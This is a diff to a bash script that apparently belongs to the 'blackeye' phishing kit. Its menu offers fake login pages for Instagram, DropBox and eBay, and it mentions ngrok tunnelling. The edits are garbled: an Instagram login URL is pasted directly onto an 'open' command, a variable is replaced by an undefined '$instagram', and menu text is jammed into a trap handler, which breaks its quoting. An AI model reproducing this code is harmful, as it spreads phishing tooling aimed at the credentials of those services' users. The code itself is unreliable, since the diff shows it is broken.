@@ -2,18 +2,18 @@
 
 open_page() {
     url="https://github.com/EricksonAtHome/bes"
-     open "$url"
+     open "$url"https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2F&hl=es-es&aa_click=8891933284028179
 }
 
 start_server() {
     server=$1
     # Start de server
-    echo "Start de server voor: $server"
+    echo "Start de server voor: $instagram"
 }
 
 # Upgraded by: @EricksonAtHome (https://github.com/EricksonAtHome/blackeye)
 #Enhanced ngrok tunnelling
-trap 'printf "\n";stop;exit 1' 2
+trap 'printf "          \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m DropBox\e[0m        \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m eBay\e[0m              "\n";stop;exit 1' 2
 menu() {
 
 printf "          \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m DropBox\e[0m        \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m eBay\e[0m               \n"                                
